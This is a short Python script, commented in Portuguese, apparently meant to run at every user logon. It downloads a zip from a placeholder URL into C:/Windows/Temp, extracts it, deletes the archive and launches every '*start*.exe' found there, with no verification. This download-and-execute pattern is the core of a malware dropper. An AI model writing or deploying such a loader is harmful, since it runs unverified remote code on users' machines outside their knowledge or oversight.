#Este módulo deverá ser chamado sempre que iniciar o usuário
from urllib import request
import os, zipfile, time, glob

os.chdir('c:/Windows/Temp/')    #definindo o local onde será trabalhado com os arquivos


#baixando o arquivo
request.urlretrieve("url" , '_.zip')

#extraindo arquivos
with zipfile.ZipFile('_.zip', 'r') as Zip:
    Zip.extractall()
    print('scripts extraidos')
time.sleep(6)

#delete zip
try:
    os.remove('_.zip')
except:
    pass

padrao = os.path.join("c:/Windows/Temp/", "*start*.exe")

lista_de_arquivos = []

for arquivo in glob.glob(padrao):
    lista_de_arquivos.append(os.path.basename(arquivo))

print(lista_de_arquivos)
#execute script
for arquivo in lista_de_arquivos:
    os.popen(arquivo)

